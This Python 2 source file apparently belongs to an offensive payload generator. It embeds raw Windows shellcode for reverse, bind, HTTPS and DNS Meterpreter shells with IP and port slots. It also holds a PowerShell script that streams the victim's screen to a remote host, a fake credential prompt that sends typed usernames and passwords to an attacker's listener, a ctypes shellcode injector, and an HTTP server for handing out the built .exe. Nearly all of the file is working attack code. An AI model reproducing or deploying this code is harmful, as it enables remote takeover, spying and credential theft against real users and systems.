# -*- coding: utf-8 -*-
import os
import socket
import re
import subprocess
import struct
import sys
import blessings
import random
import SimpleHTTPServer
import SocketServer
import multiprocessing
from Crypto.Cipher import AES
import base64
import string
import glob
import readline
import time
import psexec
import urllib2
from collections import OrderedDict
import string

t = blessings.Terminal()



class SHELLCODE(object):

    windows_rev_shell = (
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
        "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
        "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
        "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
        "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
        "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
        "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
        "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
        "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
        "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
        "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
        "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
        "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
        "\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
        "\xdf\xe0\xff\xd5\x97\x6a\x05\x68%s\x68" #ip
        "\x02\x00%s\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
        "\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
        "\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
        "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
        "\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
        "\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
        "\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
        "\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
        "\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5")

    windows_met_rev_shell = (
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
        "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
        "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
        "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
        "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
        "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
        "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
        "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
        "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
        "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
        "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
        "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
        "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
        "\xff\xd5\x6a\x05\x68%s\x68\x02\x00%s" #ip,port
        "\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
        "\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
        "\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec"
        "\xe8\x61\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02"
        "\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a"
        "\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
        "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
        "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00\x40"
        "\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57"
        "\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9"
        "\x71\xff\xff\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0"
        "\xb5\xa2\x56\x6a\x00\x53\xff\xd5")

    windows_met_bind_shell = (
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
        "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
        "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
        "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
        "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
        "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
        "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
        "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
        "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
        "\x29\x80\x6b\x00\xff\xd5\x6a\x0b\x59\x50\xe2\xfd\x6a\x01\x6a"
        "\x02\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00%s\x89" #port
        "\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85\xc0\x75"
        "\x58\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1"
        "\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x6a\x00\x6a\x04"
        "\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x2d\x8b"
        "\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
        "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f"
        "\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3")

    windows_met_rev_https_shell = (
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
        "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
        "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
        "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
        "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
        "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
        "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
        "\x8d\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c"
        "\x77\x26\x07\xff\xd5\x31\xdb\x53\x53\x53\x53\x53\x68\x3a\x56"
        "\x79\xa7\xff\xd5\x53\x53\x6a\x03\x53\x53\x68%s\x00\x00" #port
        "\xe8\x8c\x00\x00\x00\x2f\x53\x32\x49\x34\x5a\x00\x50\x68\x57"
        "\x89\x9f\xc6\xff\xd5\x89\xc6\x53\x68\x00\x32\xe0\x84\x53\x53"
        "\x53\x57\x53\x56\x68\xeb\x55\x2e\x3b\xff\xd5\x96\x6a\x0a\x5f"
        "\x68\x80\x33\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56\x68\x75"
        "\x46\x9e\x86\xff\xd5\x53\x53\x53\x53\x56\x68\x2d\x06\x18\x7b"
        "\xff\xd5\x85\xc0\x75\x0a\x4f\x75\xd9\x68\xf0\xb5\xa2\x56\xff"
        "\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x53\x68"
        "\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20"
        "\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd"
        "\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\x5f\xe8\x75\xff\xff"
        "\xff%s\x00") #ip

    windows_met_rev_shell_dns = (
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
        "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
        "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
        "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
        "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
        "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
        "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
        "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
        "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
        "\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
        "\xea\x0f\xdf\xe0\xff\xd5\x97\xe8\x40\x00\x00\x00%s\x00"
        "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
        "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
        "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
        "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
        "\x00\x68\xa9\x28\x34\x80\xff\xd5\x8b\x40\x1c\x6a\x05\x50\x68"
        "\x02\x00%s\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
        "\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
        "\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
        "\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
        "\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
        "\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3")

    windows_ps_rev_watch_screen = (
        "Add-Type -AssemblyName System.Windows.Forms;[System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream;"
        "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');$stream = $client.GetStream();"
        "$ssl = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
        "$ssl.AuthenticateAsClient($env:computername);function SendResponse($sock, $string){$bytesSent = $sock.Write($string)};"
        "function SendStrResponse($sock, $string){$bytesSent = $sock.Write([text.Encoding]::Ascii.GetBytes($string))};"
        "function SendHeader($sock,$length,$statusCode = \"200 OK\",$mimeHeader=\"text/html\",$httpVersion=\"HTTP/1.1\"){$response = \"HTTP/1.1 $statusCode`r`n\" + \"Content-Type: multipart/x-mixed-replace; boundary=--boundary`r`n`n\";"
        "SendStrResponse $sock $response;}SendHeader $ssl;"
        "While ($client.Connected){$b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);"
        "$g = [System.Drawing.Graphics]::FromImage($b);"
        "$g.CopyFromScreen((New-Object System.Drawing.Point(0,0)), (New-Object System.Drawing.Point(0,0)), $b.Size);"
        "$g.Dispose();$MemoryStream.SetLength(0);$b.Save($MemoryStream, ([system.drawing.imaging.imageformat]::jpeg));"
        "$b.Dispose();$length = $MemoryStream.Length;[byte[]] $Bytes = $MemoryStream.ToArray();"
        "$str = \"`n`n--boundary`n\" + \"Content-Type: image/jpeg`n\" + \"Content-Length: $length`n`n\";"
        "SendStrResponse $ssl $str;SendResponse $ssl $Bytes};$MemoryStream.Close()")

    windows_ps_ask_creds_tcp = (
        "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');$stream = $client.GetStream();"
        "$ssl = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
        "$ssl.AuthenticateAsClient($env:computername);"
        "$ErrorActionPreference=\"SilentlyContinue\";Add-Type -assemblyname system.DirectoryServices.accountmanagement;"
        "$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);"
        "$domainDN = \"LDAP://\" + ([ADSI]\"\").distinguishedName;"
        "while($true){$credential = $host.ui.PromptForCredential(\"Credentials are required to perform this operation!\", \"\", \"\", \"\");"
        "if($credential){$creds = $credential.GetNetworkCredential();[String]$user = $creds.username;[String];$pass = $creds.password;"
        "$send = ([text.encoding]::ASCII).GetBytes('>> INCORRECT -- ' + 'Username: ' + $user + ' Password: ' + $pass);"
        "$ssl.Write($send,0,$send.Length);"
        "[String]$domain = $creds.domain;$authlocal = $DS.ValidateCredentials($user, $pass);"
        "$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass);"
        "if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){"
        "$send = ([text.encoding]::ASCII).GetBytes('>> CORRECT -- ' + 'Username: ' + $user + ' Password: ' + $pass);"
        "$ssl.Write($send,0,$send.Length);Exit}}}")

    injectwindows = """shellcode = bytearray('%s')
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
"""


class FUNCTIONS(object):

    def powershellShellcodeLayout(self,powershellExec):
        powershellShellcode = re.sub(r'\\x', '0x', powershellExec)
        count = 0
        newpayloadlayout = ''
        for char in powershellShellcode:
            count += 1
            newpayloadlayout += char
            if count == 4:
                newpayloadlayout += ','
                count = 0
        return newpayloadlayout

    def CheckInternet(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 0))
            IP = s.getsockname()[0]
            return IP
        except:
            return None

    def ServePayload(self, payloaddirectory):
        try:
            os.chdir(payloaddirectory)
            Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
            httpd = SocketServer.TCPServer(('', 8000), Handler)
            httpd.serve_forever()
        except:
            print t.bold_red + '\n[*] WebServer Shutdown' + t.normal

    def DoServe(self, IP, payloadname, payloaddir):
        print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s.exe" % (IP, payloadname) + t.normal
        a = multiprocessing.Process(
            target=self.ServePayload, args=(payloaddir,))
        a.daemon = True
        a.start()


class Spinner(object):

    def __init__(self,text):
        self.spinner = [
            ["|", "\\", "-", "/"],
            ["▁","▃","▄","▅","▆","▇","█","▇","▆","▅","▄","▃"],
            ["◡◡", "⊙⊙", "◠◠"],
            ["◐","◓","◑","◒"],
            ["▉","▊","▋","▌","▍","▎","▏","▎","▍","▌","▋","▊","▉"],
            [".","o","O","@","*"],
            ["◴","◷","◶","◵"],
            ["▖","▘","▝","▗"],
            ["←","↖","↑","↗","→","↘","↓","↙"],
            ["◢","◣","◤","◥"]
            ]
        self.loading = list(text)
        self.randomchoice = random.choice(self.spinner)
        self.spin_1 = len(self.randomchoice)
        self.spin_2 = len(self.loading) + 1
        self.x = 0

    def Looper(self, text):
        print t.bold_green,
        sys.stdout.write('\r')
        sys.stdout.write(text)
        print t.normal,
        sys.stdout.flush()

    def Update(self):
        self.spin_2mod = self.x % self.spin_2
        self.Looper(self.randomchoice[self.x % self.spin_1] + " " + "".join(
            self.loading[0: (self.spin_2mod)]) + (" " * (self.spin_2 - self.spin_2mod)))
        self.x += 1
